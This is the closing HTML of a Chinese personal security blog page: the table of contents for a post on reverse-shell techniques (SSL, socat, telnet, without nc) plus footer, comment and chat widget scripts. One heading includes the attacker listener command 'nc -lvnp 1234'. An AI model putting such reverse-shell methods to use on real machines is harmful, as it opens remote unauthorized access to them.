href="#5%E3%80%81SSL-%E5%8F%8D%E5%BC%B9shell-%E5%8A%A0%E5%AF%86-%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%8F%8D%E5%BC%B9shell-%E6%94%BB%E5%87%BB%E8%80%85%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3-nc-lvnp-1234"><span class="toc-number">0.3.</span> <span class="toc-text">5、SSL 反弹shell(加密)目标机反弹shell 攻击者监听端口 nc -lvnp 1234</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">0.4.</span> <span class="toc-text">6、Socat反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81%E4%B8%8D%E4%BD%BF%E7%94%A8nc%E6%9D%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">0.5.</span> <span class="toc-text">7、不使用nc来反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">0.6.</span> <span class="toc-text">8、telnet反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81%E6%B3%A8%E6%84%8F"><span class="toc-number">0.7.</span> <span class="toc-text">9、注意</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/backup.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Fstraw</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ccc-f.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/fancybox.umd.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="/js/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>var requestSetting = function (from,set) {
+    var from = from
+    var setting = set.split(',').filter(function(item){
+    return from.indexOf(item) > -1
+    });
+    setting = setting.length == 0 ? from :setting;
+    return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'')
+var requiredFields = requestSetting(['nick','mail'],'nick,mail')
+function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      master:'7f26fd285f1e832baef86f5bcaadd06a',
+      pageSize:'10',
+      lang:'zh-CN',
+      placeholder:'建议使用QQ邮箱,评论头像采用QQ头像',
+      recordIP:'true',
+      enableQQ:'true',
+      requiredFields: requiredFields,
+      appId: '9xmgN7UpSgxN7k2zu16HHcl6-gzGzoHsz',
+      appKey: '6t7uQFgue7owtGg4R7ieIYWu',
+      avatar: 'monsterid',
+      serverURLs: 'https://9xmgn7up.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('/js/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="/js/fireworks.min.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>((window.gitter = {}).chat = {}).options = {
+  disableDefaultChat: true,
+};
+document.addEventListener('gitter-sidecar-ready', (e) => {
+  const GitterChat = e.detail.Chat
+  let chat
+
+  function initGitter () {
+    chat = new GitterChat({
+      room: 'blogroom/test',
+      activationElement: '#chat_btn'
+    });
+  }
+
+  initGitter()
+
+  if (false) {
+    document.addEventListener('pjax:complete', () => {
+      chat.destroy()
+      initGitter()
+    })
+  }
+
+})</script><script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async="async" defer="defer"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
